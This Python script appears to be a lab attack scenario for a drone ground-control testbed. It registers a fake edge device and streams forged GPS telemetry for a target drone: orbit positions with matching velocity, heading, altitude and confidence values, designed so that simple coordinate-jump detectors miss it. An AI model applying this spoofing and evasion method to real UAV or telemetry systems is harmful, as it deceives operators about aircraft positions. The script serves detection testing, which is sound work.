"""
동역학 일치 GPS 스푸핑 공격
PDF 시나리오 #10 | arXiv:2501.07597

위치값만이 아니라 속도·heading·고도 변화까지 물리적으로
그럴듯하게 위조해 단순 좌표 변화 기반 탐지를 우회한다.
"""
from __future__ import annotations
import argparse, math, random, time
from .common import GcsClient, wait_for_gcs


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="동역학 일치 GPS 스푸핑 공격")
    parser.add_argument("--service-url",   default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",  default="small-dronebot-01")
    parser.add_argument("--spoof-edge-id", default="edge-attack-dynspoof-01")
    parser.add_argument("--orbit-speed",   type=float, default=0.4,
                        help="위조 궤도 각속도 (rad/s)")
    parser.add_argument("--orbit-radius",  type=float, default=120.0,
                        help="목표 궤도 반경 (m)")
    parser.add_argument("--interval-s",    type=float, default=0.9)
    parser.add_argument("--duration-s",    type=float, default=100.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    try:
        client.post("/api/edge/devices/register", {
            "edge_id":         args.spoof_edge_id,
            "device_type":     "uav_edge",
            "asset_ids":       [args.target_asset],
            "authority":       "EXTERNAL-ATTACKER",
            "link_profiles":   ["rf_spoofed"],
            "capabilities":    ["telemetry_ingest"],
            "software_version": "spoof-dynspoof-0.1",
        })
        print(f"[dynspoof] 위장 엣지 등록: {args.spoof_edge_id}", flush=True)
    except Exception as e:
        print(f"[dynspoof] 등록 건너뜀: {e}", flush=True)

    start = time.time()
    tick = 0
    base_x, base_y, base_z = 200.0, -220.0, 95.0

    print(f"[dynspoof] 공격 시작 — 목표: {args.target_asset}", flush=True)

    while (time.time() - start) < args.duration_s:
        elapsed = time.time() - start

        # 점진적으로 궤도 반경 증가 (갑작스러운 이동 회피)
        current_radius = min(args.orbit_radius, elapsed * 3.0)
        angle = elapsed * args.orbit_speed

        # 위치 계산 (원형 궤도)
        spoof_x = base_x + math.cos(angle) * current_radius
        spoof_y = base_y + math.sin(angle) * current_radius
        spoof_z = base_z + math.sin(elapsed * 0.25) * 15.0  # 고도 파형

        # 속도도 궤도에 맞춰 위조 (단순 위치 변화 탐지 우회)
        vel_x = -math.sin(angle) * current_radius * args.orbit_speed
        vel_y = math.cos(angle) * current_radius * args.orbit_speed
        vel_z = math.cos(elapsed * 0.25) * 15.0 * 0.25

        heading = (math.degrees(angle + math.pi / 2)) % 360
        track_confidence = 0.87 + random.gauss(0, 0.02)  # 정상 범위 내 유지

        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         args.target_asset,
                "time_s":           elapsed,
                "position":         [round(spoof_x, 2), round(spoof_y, 2), round(spoof_z, 2)],
                "velocity_mps":     [round(vel_x, 2), round(vel_y, 2), round(vel_z, 2)],
                "heading_deg":      round(heading, 1),
                "status":           "edge-live",
                "source":           "DYN-SPOOF",
                "source_id":        args.spoof_edge_id,
                "source_type":      "uav_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": round(track_confidence, 3),
                "link_profile":     "rf_spoofed",
            })
            print(
                f"[dynspoof] tick={tick:04d} | r={current_radius:.1f}m "
                f"| pos=[{spoof_x:.1f},{spoof_y:.1f},{spoof_z:.1f}] "
                f"| vel=[{vel_x:.1f},{vel_y:.1f}] | hdg={heading:.1f}°",
                flush=True,
            )
        except Exception as e:
            print(f"[dynspoof] 오류: {e}", flush=True)

        tick += 1
        time.sleep(args.interval_s)

    print("[dynspoof] 공격 종료", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
